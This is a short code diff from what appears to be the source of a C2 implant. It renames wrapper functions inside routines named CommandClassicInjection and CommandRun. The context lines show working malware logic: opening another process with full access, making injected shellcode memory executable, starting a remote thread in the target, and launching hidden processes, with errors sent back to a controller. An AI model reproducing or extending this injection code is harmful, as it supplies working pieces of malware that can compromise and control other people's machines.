@@ -96,7 +96,7 @@ FUNC VOID CommandClassicInjection(
 
     BK_PRINT( "[I] Process Id into inject %d\n[I} Shellcode size %d \n", ProcessId, RegionSize );
 
-    Err = bkOpenProcess( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
+    Err = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
     if ( Err != 0 ) {
         PackageTransmitError( Err );
         return;
@@ -130,7 +130,7 @@ FUNC VOID CommandClassicInjection(
 
     BK_PRINT( "[I] Memory protection changed to RX\n" );
 
-    Err = bkCreateThread( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
+    Err = bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
     if ( Err != 0 ) {
         PackageTransmitError( Err );
         return;
@@ -194,7 +194,7 @@ FUNC VOID CommandRun(
     HANDLE   ThreadHandle  = NULL;
     BOOL     bCheck        = FALSE;
 
-    bCheck = bkCreateProcess( ProcCmd, FALSE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
+    bCheck = bkProcessCreate( ProcCmd, FALSE, CREATE_NO_WINDOW, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
     if ( !bCheck )
         return;
 
